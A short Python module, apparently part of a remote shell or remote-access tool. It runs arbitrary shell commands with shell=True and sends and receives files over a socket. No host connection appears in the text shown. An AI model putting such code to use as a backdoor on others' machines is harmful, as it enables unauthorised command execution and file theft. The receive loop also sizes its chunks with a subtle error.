#libs
import subprocess
import os

def ExecuteCommand(command):
	if command.startswith("cd"):
		os.chdir(command[3:].strip())
		return os.getcwd()
	run = subprocess.Popen(command,shell=True\
,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
	output = run.stdout.read() + run.stderr.read()
	return output


def SendData(c,filepath):
	try:
		if "/" not in filepath and \
"\\" not in filepath:
			filepath = os.path.join(\
os.getcwd(),os.path.basename(filepath.strip()))
			#print(filepath)

		#file size and name
		filename = filepath.replace("\\","/")\
.split("/")[-1]
		
		filesize = str(os.path.getsize(filepath))

		#send filename and filesize
		header = f"{filename}|{filesize}"
		c.sendall(header.encode())
		#c.sendall(filename.encode())
		#c.sendall(filesize.encode())
		filesize = int(filesize)
		with open(filepath,"rb") as f :
			while True:
				data = f.read(1024)
				if not data:
					break
				c.sendall(data)
		return "Done from our/theirSide"

	except Exception as e:
		return e

cwd = os.getcwd()
def ReciveData(c,filepath=cwd):
	try:
		header = str(c.recv(1024).decode())
		filename = header.split("|")[0]
		filesize = int(header.split("|")[1])
		print(filename)
		print(filesize)
		with open(filename,"wb") as f :
			remain = filesize
			while remain > 0:
				if filesize >= 1024:
					chunk = 1024
				else:
					chunk = remain
				data = c.recv(chunk)
				if not data:
					break
				f.write(data)

				remain = remain - len(data)
		return "recieved"
	except Exception as e :
		return e

